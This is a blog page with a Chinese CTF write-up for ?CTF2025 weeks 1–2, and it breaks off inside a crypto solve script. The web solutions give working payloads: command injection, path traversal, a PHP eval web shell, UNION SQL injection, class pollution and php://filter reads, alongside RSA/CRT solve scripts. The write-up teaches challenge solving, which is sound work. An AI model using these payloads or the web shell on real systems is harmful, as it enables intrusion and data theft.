<!DOCTYPE html><script type="text/javascript" src="/js/crash_cheat.js"></script><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>?CTF2025_week1&amp;week2_WP | 晨曦的个人小站</title><meta name="author" content="晨曦"><meta name="copyright" content="晨曦"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="?CTF week1和week2的wp">
<meta property="og:type" content="article">
<meta property="og:title" content="?CTF2025_week1&amp;week2_WP">
<meta property="og:url" content="http://example.com/%EF%BC%9FCTF2025_week1&week2_WP/index.html">
<meta property="og:site_name" content="晨曦的个人小站">
<meta property="og:description" content="?CTF week1和week2的wp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/%EF%BC%9FCTF2025_week1&week2_WP/%E5%B0%81%E9%9D%A2.jpg">
<meta property="article:published_time" content="2025-10-21T11:20:34.000Z">
<meta property="article:modified_time" content="2025-10-21T11:26:31.401Z">
<meta property="article:author" content="晨曦">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="write up">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/%EF%BC%9FCTF2025_week1&week2_WP/%E5%B0%81%E9%9D%A2.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/%EF%BC%9FCTF2025_week1&amp;week2_WP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '?CTF2025_week1&week2_WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-10-21 19:26:31'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/nav.css"><link rel="stylesheet" href="/css/bj.css"><link rel="stylesheet" href="/css/cat.css"><div id="myscoll"></div><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/chenxi.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/%EF%BC%9FCTF2025_week1&amp;week2_WP/%E5%B0%81%E9%9D%A2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="晨曦的个人小站"><span class="site-name">晨曦的个人小站</span></a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">?CTF2025_week1&amp;week2_WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-21T11:20:34.000Z" title="发表于 2025-10-21 19:20:34">2025-10-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-21T11:26:31.401Z" title="更新于 2025-10-21 19:26:31">2025-10-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>60分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="?CTF2025_week1&amp;week2_WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week1-secret-of-php"><a href="#Week1-secret-of-php" class="headerlink" title="[Week1] secret of php"></a>[Week1] secret of php</h2><p>16进制绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=0x7e9</span><br></pre></td></tr></table></figure>

<p>来到 <strong>Flll4g.php</strong></p>
<p>md5强碰撞一把梭了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a[]=1&amp;b[]=2&amp;aa=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;bb=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;aaa=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;bbb=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<h2 id="Week1-包含不明东西的食物？！"><a href="#Week1-包含不明东西的食物？！" class="headerlink" title="[Week1] 包含不明东西的食物？！"></a>[Week1] 包含不明东西的食物？！</h2><p>查看页面源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004111911564.png" alt="image-20251004111911564"></p>
<p>路径穿越读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../../../../../../flag.txt</span><br></pre></td></tr></table></figure>

<h2 id="Week1-Ping"><a href="#Week1-Ping" class="headerlink" title="[Week1] Ping??"></a>[Week1] Ping??</h2><p>非预期</p>
<p>访问<code>/flag.txt</code></p>
<p>预期</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;cat f*;</span><br></pre></td></tr></table></figure>

<h2 id="Week1-前端小游戏"><a href="#Week1-前端小游戏" class="headerlink" title="[Week1] 前端小游戏"></a>[Week1] 前端小游戏</h2><p>在<code>game.js</code>找到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004124636004.png" alt="image-20251004124636004"></p>
<h2 id="Week1-Gitttttttt"><a href="#Week1-Gitttttttt" class="headerlink" title="[Week1] Gitttttttt"></a>[Week1] Gitttttttt</h2><p>git泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python GitHack.py http://challenge.ilovectf.cn:30656/.git/</span><br></pre></td></tr></table></figure>

<p>得到<code>flag_yooooooouuuuuu_caannnnnnnntttttttt_fiiiiiinnnndddme.txt</code></p>
<h2 id="Week1-from-http"><a href="#Week1-from-http" class="headerlink" title="[Week1] from_http"></a>[Week1] from_http</h2><p>按照要求完成</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004125343323.png" alt="image-20251004125343323"></p>
<h2 id="Week2-这是什么函数"><a href="#Week2-这是什么函数" class="headerlink" title="[Week2] 这是什么函数"></a>[Week2] 这是什么函数</h2><p>猜测是原型链污染，后端是python环境</p>
<p>把<code>/static/</code>污染成根目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot; : &#123;&quot;app&quot; : &#123;&quot;_static_folder&quot; : &quot;/&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>接着访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/static/flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="Week2-留言板"><a href="#Week2-留言板" class="headerlink" title="[Week2] 留言板"></a>[Week2] 留言板</h2><p>fenjing一把梭</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251011104021557.png" alt="image-20251011104021557"></p>
<h2 id="Week2-Only-Picture-Up"><a href="#Week2-Only-Picture-Up" class="headerlink" title="[Week2] Only Picture Up"></a>[Week2] Only Picture Up</h2><p>先上传图片马，然后文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?preview=a.jpg</span><br><span class="line"></span><br><span class="line">POST: 1=system(&quot;cat /F*&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="Week2-Regular-Expression"><a href="#Week2-Regular-Expression" class="headerlink" title="[Week2] Regular Expression"></a>[Week2] Regular Expression</h2><p>正则表达式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?=-ctf%3C%0A%3E%3E%3E%3E%3Eh00!!!!!!!!!!@email.com%20flaga</span><br><span class="line">POST: preg=||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||Please.*Flaggg0</span><br></pre></td></tr></table></figure>



<h2 id="Week2-登录和查询"><a href="#Week2-登录和查询" class="headerlink" title="[Week2] 登录和查询"></a>[Week2] 登录和查询</h2><p>爆破账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin:admin123</span><br></pre></td></tr></table></figure>

<p>登陆后，进行SQL注入</p>
<p>查表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,group_concat(hex(table_name)),1 from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">666C616773,7365637265745F64617461,7573657273</span><br><span class="line">flags,secret_data,users</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查列名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(hex(column_name)),3 from information_schema.columns where table_schema=database() and table_name=&#x27;flags&#x27;--+</span><br><span class="line"></span><br><span class="line">6964,666C6167</span><br><span class="line">id,flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查数据(flag)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,concat(0x7e,id,0x7e,flag,0x7e),1 from flags limit 1,1 --+</span><br><span class="line"></span><br><span class="line">2~flag&#123;e4113521-e71b-42eb-a71c-a3e55c7aef2d&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Week2-Look-at-the-picture"><a href="#Week2-Look-at-the-picture" class="headerlink" title="[Week2] Look at the picture"></a>[Week2] Look at the picture</h2><p>使用伪协议读取<code>/flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://filter/resource=/flag</span><br></pre></td></tr></table></figure>





<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Week1-Basic-Number-theory"><a href="#Week1-Basic-Number-theory" class="headerlink" title="[Week1] Basic Number theory"></a>[Week1] Basic Number theory</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>(<span class="params">m, prime</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, (prime + <span class="number">1</span>) // <span class="number">2</span>, prime)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gift1 = <span class="subst">&#123;gift(m, p)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gift2 = <span class="subst">&#123;gift(m, q)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 71380997427449345634700552609577271052193856747526826598031269184817312570231</span></span><br><span class="line"><span class="comment"># q = 65531748297495117965939047069388412545623909154912018722160805504300279801251</span></span><br><span class="line"><span class="comment"># gift1 = 40365143212042701723922505647865230754866250738391105510918441288000789123995</span></span><br><span class="line"><span class="comment"># gift2 = 10698628345523517254945893573969253712072344217500232111817321788145975103342</span></span><br></pre></td></tr></table></figure>

<p>函数<code>gift(m, prime) = pow(m, (prime + 1) // 2, prime)</code>的核心是利用了素数模下的二次剩余性质。对于奇素数<code>p</code>，根据欧拉准则：</p>
<ul>
<li>若<code>m</code>是模<code>p</code>的二次剩余，则<code>m^((p-1)/2) ≡ 1 mod p</code></li>
<li>若<code>m</code>不是模<code>p</code>的二次剩余，则<code>m^((p-1)/2) ≡ -1 mod p</code></li>
</ul>
<p>因此，<code>gift(m, p) = m^((p+1)/2) mod p = m * m^((p-1)/2) mod p ≡ ±m mod p</code>。即<code>gift1 ≡ ±m mod p</code>，<code>gift2 ≡ ±m mod q</code>。</p>
<p><code>m</code>模<code>p</code>和模<code>q</code>的可能取值各有 2 种，共 4 种组合：</p>
<ul>
<li><code>m ≡ gift1 mod p</code> 且 <code>m ≡ gift2 mod q</code></li>
<li><code>m ≡ gift1 mod p</code> 且 <code>m ≡ -gift2 mod q</code></li>
<li><code>m ≡ -gift1 mod p</code> 且 <code>m ≡ gift2 mod q</code></li>
<li><code>m ≡ -gift1 mod p</code> 且 <code>m ≡ -gift2 mod q</code></li>
</ul>
<p>枚举 4 种可能的组合，用 CRT 求解<code>m</code>并还原<code>flag</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知参数</span></span><br><span class="line">p = <span class="number">71380997427449345634700552609577271052193856747526826598031269184817312570231</span></span><br><span class="line">q = <span class="number">65531748297495117965939047069388412545623909154912018722160805504300279801251</span></span><br><span class="line">gift1 = <span class="number">40365143212042701723922505647865230754866250738391105510918441288000789123995</span></span><br><span class="line">gift2 = <span class="number">10698628345523517254945893573969253712072344217500232111817321788145975103342</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算m mod p的两种可能</span></span><br><span class="line">x1 = gift1</span><br><span class="line">x2 = (p - gift1) % p  <span class="comment"># 等价于 -gift1 mod p</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算m mod q的两种可能</span></span><br><span class="line">y1 = gift2</span><br><span class="line">y2 = (q - gift2) % q  <span class="comment"># 等价于 -gift2 mod q</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算p在模q下的逆元（费马小定理，因q是素数）</span></span><br><span class="line">inv_p_q = <span class="built_in">pow</span>(p, q - <span class="number">2</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crt</span>(<span class="params">a, b, p, q, inv_p_q</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;用CRT求解m ≡ a mod p且m ≡ b mod q&quot;&quot;&quot;</span></span><br><span class="line">    delta = (b - a) % q  <span class="comment"># 确保差值为正数</span></span><br><span class="line">    k = (delta * inv_p_q) % q  <span class="comment"># 求解k使得a + k*p ≡ b mod q</span></span><br><span class="line">    <span class="keyword">return</span> a + k * p  <span class="comment"># 得到m</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举4种组合并尝试还原flag</span></span><br><span class="line">candidates = [</span><br><span class="line">    crt(x1, y1, p, q, inv_p_q),</span><br><span class="line">    crt(x1, y2, p, q, inv_p_q),</span><br><span class="line">    crt(x2, y1, p, q, inv_p_q),</span><br><span class="line">    crt(x2, y2, p, q, inv_p_q)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串并输出有效的flag</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> candidates:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = long_to_bytes(m).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> flag:  <span class="comment"># 假设flag格式为flag&#123;...&#125;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;找到flag:&quot;</span>, flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="comment"># 找到flag: flag&#123;Th3_c0rner5t0ne_0f_C2ypt0gr@phy&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="Week1-xorRSA"><a href="#Week1-xorRSA" class="headerlink" title="[Week1] xorRSA"></a>[Week1] xorRSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">p_q = p ^ q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p_q = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 18061840786617912438996345214060567122008006566608565470922708255493870675991346333993136865435336505071047681829600696007854811200192979026938621307808394735367086257150823868393502421947362103403305323343329530015886676141404847528567199164203106041887980250901224907217271412495658238000428155863230216487699143138174899315041844320680520430921010039515451825289303532974354096690654604842256150621697967106463329359391655215554171614421198047559849727235032270127681416682155240317343037276968357231651722266548626117109961613350614054537118394055824940789414473424585411579459583308685751324937629321503890169493</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 17953801553187442264071031639061239403375267544951822039441227630063465978993165328404783737755442118967031318698748459837999730471765908918892704038188635488634468552787554559846820727286284092716064629914340869208385181357615817945878013584555521801850998319665267313161882027213027139165137714815505996438717880253578538572193138954426764798279057176765746717949395519605845713927900919261836299232964938356193758253134547047068462259994112344727081440167173365263585740454211244943993795874099027593823941471126840495765154866313478322190748184566075583279428244873773602323938633975628368752872219283896862671494</span></span><br><span class="line"><span class="string">p_q = 88775678961253172728085584203578801290397779093162231659217341400681830680568426254559677076410830059833478580229352545860384843730990300398061904514493264881401520881423698800064247530838838305224202665605992991627155227589402516343855527142200730379513934493657380099647739065365753038212480664586174926100</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>泄露的信息是p^q，用dfs搜索即可，剪枝加速</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">2000</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">18061840786617912438996345214060567122008006566608565470922708255493870675991346333993136865435336505071047681829600696007854811200192979026938621307808394735367086257150823868393502421947362103403305323343329530015886676141404847528567199164203106041887980250901224907217271412495658238000428155863230216487699143138174899315041844320680520430921010039515451825289303532974354096690654604842256150621697967106463329359391655215554171614421198047559849727235032270127681416682155240317343037276968357231651722266548626117109961613350614054537118394055824940789414473424585411579459583308685751324937629321503890169493</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">17953801553187442264071031639061239403375267544951822039441227630063465978993165328404783737755442118967031318698748459837999730471765908918892704038188635488634468552787554559846820727286284092716064629914340869208385181357615817945878013584555521801850998319665267313161882027213027139165137714815505996438717880253578538572193138954426764798279057176765746717949395519605845713927900919261836299232964938356193758253134547047068462259994112344727081440167173365263585740454211244943993795874099027593823941471126840495765154866313478322190748184566075583279428244873773602323938633975628368752872219283896862671494</span></span><br><span class="line">p_q = <span class="number">88775678961253172728085584203578801290397779093162231659217341400681830680568426254559677076410830059833478580229352545860384843730990300398061904514493264881401520881423698800064247530838838305224202665605992991627155227589402516343855527142200730379513934493657380099647739065365753038212480664586174926100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_rsa</span>(<span class="params">p,q,c</span>):</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, p*q)</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LEAK = <span class="built_in">bin</span>(p_q)[<span class="number">2</span>:].zfill(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">ph,qh,h</span>):</span><br><span class="line">    <span class="keyword">if</span> h == <span class="number">1024</span>:</span><br><span class="line">        p = <span class="built_in">int</span>(ph,<span class="number">2</span>)</span><br><span class="line">        q = <span class="built_in">int</span>(qh,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> p*q==n:</span><br><span class="line">            decode_rsa(p,q,c)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    pM = <span class="built_in">int</span>(ph + (<span class="number">1024</span>-h)*<span class="string">&quot;1&quot;</span>,<span class="number">2</span>)</span><br><span class="line">    qM = <span class="built_in">int</span>(qh + (<span class="number">1024</span>-h)*<span class="string">&quot;1&quot;</span>,<span class="number">2</span>)</span><br><span class="line">    pm = <span class="built_in">int</span>(ph + (<span class="number">1024</span>-h)*<span class="string">&quot;0&quot;</span>,<span class="number">2</span>)</span><br><span class="line">    qm = <span class="built_in">int</span>(qh + (<span class="number">1024</span>-h)*<span class="string">&quot;0&quot;</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pm*qm&gt;n <span class="keyword">or</span> pM*qM&lt;n:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(LEAK[h] == <span class="string">&quot;0&quot;</span>):</span><br><span class="line">        find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,h+<span class="number">1</span>)</span><br><span class="line">        find(ph+<span class="string">&quot;0&quot;</span>,qh+<span 